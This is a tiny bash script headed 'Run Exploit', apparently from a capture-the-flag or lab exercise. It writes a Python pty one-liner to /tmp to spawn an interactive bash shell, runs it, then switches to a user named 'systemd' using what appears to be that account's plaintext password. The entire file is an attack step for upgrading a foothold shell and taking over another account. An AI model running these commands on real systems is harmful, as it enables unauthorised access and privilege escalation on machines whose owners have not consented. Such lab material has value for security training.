#!/bin/bash

# Run Exploit
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
su systemd
systemd